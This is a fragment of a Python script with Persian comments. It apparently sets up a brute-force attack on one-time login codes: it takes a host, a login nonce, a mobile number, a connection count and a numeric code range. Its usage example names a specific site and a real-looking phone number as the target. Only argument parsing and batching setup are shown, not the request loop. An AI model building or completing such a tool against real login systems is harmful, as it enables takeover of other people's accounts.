...
if len(sys.argv) != 7:
    print("Usage: python script.py <host> <login_otp_nonce> <mobile> <connections> <start_range> <end_range>")
    print("Example: python script.py www.arzanpanel-iran.com 9d6178e07d 09039495749 50 00000 20000")
    sys.exit(1)

host = sys.argv[1]
login_otp_nonce = sys.argv[2]
mobile = sys.argv[3]
connections = int(sys.argv[4])  # تعداد کانکشن‌ها
start_range = int(sys.argv[5])  # رنج شروع
end_range = int(sys.argv[6])    # رنج پایان

# تنظیمات رنج
batch_size = connections  # batch_size برابر با تعداد کانکشن‌ها
